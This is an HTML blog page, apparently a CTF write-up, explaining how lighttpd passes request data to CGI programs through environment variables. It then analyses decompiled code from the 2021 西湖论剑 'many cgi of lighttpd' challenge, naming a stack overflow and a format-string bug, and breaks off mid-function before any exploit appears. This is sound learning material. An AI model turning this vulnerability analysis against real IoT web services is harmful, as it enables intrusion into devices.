@@ -1,0 +1,932 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Feng_ZZ">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Feng_ZZ">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="前言 在复习西湖论剑的题目的时候，遇到了lighttpd作为启动的server，主要想了解一下cgi与lighttpd的调用方式和cgi的调试 lighttpd与cgi的调用  主要参考文章  文章在第三部分的第四点中，已经说明了，我们无法单独的直接运行cgi，因为运行cgi依赖环境变量 这一点就是最重要的一点，简单的说lighttpd是一个启动cgi的程序，我们请求方式等其他基本的参数都是被设置">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IOT_Lighttpd">
+<meta property="og:url" content="https://feng-zz-pwn.github.io/2024/03/16/iot-lighttpd/index.html">
+<meta property="og:site_name" content="Feng_ZZ">
+<meta property="og:description" content="前言 在复习西湖论剑的题目的时候，遇到了lighttpd作为启动的server，主要想了解一下cgi与lighttpd的调用方式和cgi的调试 lighttpd与cgi的调用  主要参考文章  文章在第三部分的第四点中，已经说明了，我们无法单独的直接运行cgi，因为运行cgi依赖环境变量 这一点就是最重要的一点，简单的说lighttpd是一个启动cgi的程序，我们请求方式等其他基本的参数都是被设置">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/03/16/iot-lighttpd/image-20240316163744976.png">
+<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/03/16/iot-lighttpd/image-20240316192256669.png">
+<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/03/16/iot-lighttpd/image-20240316192136218.png">
+<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/03/16/iot-lighttpd/image-20240316192419399.png">
+<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/03/16/iot-lighttpd/image-20240316195333021.png">
+<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/03/16/iot-lighttpd/image-20240316200031079.png">
+<meta property="og:image" content="https://feng-zz-pwn.github.io/2024/03/16/iot-lighttpd/image-20240317172357216.png">
+<meta property="article:published_time" content="2024-03-16T04:43:10.000Z">
+<meta property="article:modified_time" content="2024-03-17T09:37:03.781Z">
+<meta property="article:author" content="Feng_ZZ">
+<meta property="article:tag" content="IOT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://feng-zz-pwn.github.io/2024/03/16/iot-lighttpd/image-20240316163744976.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>IOT_Lighttpd · Feng_ZZ&#39;s Studio</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- Google tag (gtag.js) -->
+    
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>笔记 & WP</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">笔记 &amp; WP</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">IOT_Lighttpd</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                IOT_Lighttpd
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="IOT">IOT</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2.3k</span>Reading time: <span class="post-count reading-time">10 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2024/03/16</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1>前言</h1>
+<p>在复习西湖论剑的题目的时候，遇到了<code>lighttpd</code>作为启动的<code>server</code>，主要想了解一下<code>cgi</code>与<code>lighttpd</code>的调用方式和<code>cgi</code>的调试</p>
+<h2 id="lighttpd与cgi的调用"><code>lighttpd</code>与<code>cgi</code>的调用</h2>
+<blockquote>
+<p>主要参考<a target="_blank" rel="noopener" href="https://www.iotsec-zone.com/article/319">文章</a></p>
+</blockquote>
+<p>文章在第三部分的第四点中，已经说明了，我们无法单独的直接运行<code>cgi</code>，因为运行<code>cgi</code>依赖环境变量</p>
+<p>这一点就是最重要的一点，简单的说<code>lighttpd</code>是一个启动<code>cgi</code>的程序，我们请求方式等其他基本的参数都是被设置成环境变量</p>
+<p>所以我们如果想要调试<code>cgi</code>程序的话，我们肯定需要设置环境变量，也就是模拟<code>lighttpd</code>的作用</p>
+<p>所以我们可以<s>笼统</s>抽象的理解，<code>lighttpd</code>的作用是把我们发送数据包的各种参数设置为环境变量，当然除了我们<code>get</code>或<code>post</code>的载荷数据</p>
+<p>所以大致流程就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lighttpd =====接收数据包====&gt; 参数设置环境变量</span><br><span class="line">         ====判断需要调用的cgi===&gt; cgi</span><br><span class="line">         ====调用cgi=====&gt; 回显</span><br></pre></td></tr></table></figure>
+<p><code>lighttpd</code>在调用<code>cgi</code>时，是使用fork函数然后执行<code>execve</code>函数来实现的，所以我们很难在运行<code>lighttpd</code>中，调试<code>cgi</code>程序，在研究官方WP时，他给出的方法是，直接模拟<code>lighttpd</code>的作用，也就是设置环境变量，然后才运行我们要调式的程序的</p>
+<p>ok，调试的方法和原理也大致剖析完毕，我们可以开始PWN！！！！！！</p>
+<h1>西湖论剑2021——<code>many cgi of lighttpd</code></h1>
+<blockquote>
+<p>在这里我也学习到了<code>lighttpd</code>调用<code>cgi</code>的位置关系，基本上是在<code>./www/cgi-bin/</code>目录下</p>
+</blockquote>
+<p>在这个目录下，我们可以看到三个程序</p>
+<img src="/2024/03/16/iot-lighttpd/image-20240316163744976.png" class="" title="image-20240316163744976">
+<p>我们根据WP上分析的，就指向了<code>55.cgi</code>和<code>63.cgi</code>，一个是栈溢出，一个是格式化字符串漏洞</p>
+<p>所以我们就可以来分析一下这两个程序</p>
+<h2 id="55-cgi"><code>55.cgi</code></h2>
+<p><code>main</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_10CF0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [sp+4h] [bp-18h]</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [sp+8h] [bp-14h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// [sp+Ch] [bp-10h]</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [sp+10h] [bp-Ch]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s1; <span class="comment">// [sp+14h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !sub_109F0() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No Authentication&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Content-Type: text/plain\n&quot;</span>);</span><br><span class="line">  s1 = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;GET&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = getenv(<span class="string">&quot;QUERY_STRING&quot;</span>);</span><br><span class="line">    sub_10B48(v6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_10B48(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = getenv(<span class="string">&quot;CONTENT_TYPE&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v5, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CONTENT_TYPE not supported now !&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v0 = getenv(<span class="string">&quot;CONTENT_LENGTH&quot;</span>);</span><br><span class="line">  n = atoi(v0);</span><br><span class="line">  <span class="keyword">if</span> ( n &lt;= <span class="number">3316</span> &amp;&amp; n &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">calloc</span>(n + <span class="number">1</span>, <span class="number">1u</span>);</span><br><span class="line">    fread(ptr, <span class="number">1u</span>, n, (FILE *)<span class="built_in">stdin</span>);</span><br><span class="line">    sub_10B48((<span class="type">char</span> *)ptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;CONTENT_LENGTH not supported now !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们层层分析，下面来看<code>sub_109F0()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">int sub_109F0()</span><br><span class="line">&#123;</span><br><span class="line">  char s[20]; // [sp+0h] [bp-54h] BYREF</span><br><span class="line">  char s2[20]; // [sp+14h] [bp-40h] BYREF</span><br><span class="line">  char haystack[24]; // [sp+28h] [bp-2Ch] BYREF</span><br><span class="line">  char *v4; // [sp+40h] [bp-14h]</span><br><span class="line">  char *v5; // [sp+44h] [bp-10h]</span><br><span class="line">  char *v6; // [sp+48h] [bp-Ch]</span><br><span class="line">  int v7; // [sp+4Ch] [bp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = 0;</span><br><span class="line">  v6 = getenv(&quot;HTTP_COOKIES&quot;);</span><br><span class="line">  memset(s, 0, 0x11u);</span><br><span class="line">  sub_108D0(s);</span><br><span class="line">  if ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(haystack, 0, 0x17u);</span><br><span class="line">    snprintf(haystack, 0x16u, &quot;%s&quot;, v6);</span><br><span class="line">    v5 = strstr(haystack, &quot;uuid=&quot;);</span><br><span class="line">    if ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v5 + 5;</span><br><span class="line">      memset(s2, 0, 0x11u);</span><br><span class="line">      snprintf(s2, 0x11u, &quot;%s&quot;, v5 + 5);</span><br><span class="line">      if ( !strncmp(s, s2, 0x10u) )</span><br><span class="line">        v7 = 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有个比对，需要我们让<code>s</code>和<code>s2</code>相等，我们可以看的出<code>s2</code>是由我们环境变量<code>HTTP_COOKIES</code>得到的，下面我们看看我们是如何得到<code>s</code>的值的</p>
+<p><code>sub_108D0(char *a1)</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sub_108D0</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [sp+Ch] [bp-28h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [sp+24h] [bp-10h]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [sp+28h] [bp-Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [sp+2Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x17</span>u);</span><br><span class="line">  stream = fopen(<span class="string">&quot;/var/tmp/session&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No Session&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">22</span>, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  result = <span class="built_in">strstr</span>(s, <span class="string">&quot;uuid=&quot;</span>);</span><br><span class="line">  v5 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v5 + <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(s, <span class="number">0x11</span>u, <span class="string">&quot;%s&quot;</span>, v5 + <span class="number">5</span>);</span><br><span class="line">    result = <span class="built_in">strncpy</span>(a1, s, <span class="number">0x10</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到是由我们<code>/var/tmp/session</code>文件得到，所以这个是我们要执行后面内容必要拿到<code>session</code>的值</p>
+<p>我们继续往下面看，我们看<code>POST</code>请求时会调用的函数</p>
+<p><code>sub_10B48(0);</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sub_10B48</span><span class="params">(<span class="type">char</span> *result)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 *s1; <span class="comment">// [sp+4h] [bp-D20h]</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">3316</span>]; <span class="comment">// [sp+Ch] [bp-D18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [sp+D00h] [bp-24h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [sp+D04h] [bp-20h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [sp+D08h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+D0Ch] [bp-18h]</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [sp+D10h] [bp-14h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+D14h] [bp-10h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+D18h] [bp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *s2; <span class="comment">// [sp+D1Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  s1 = (<span class="type">unsigned</span> __int8 *)result;</span><br><span class="line">  s2 = <span class="string">&quot;*#$^&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(result, s2, <span class="number">4u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = 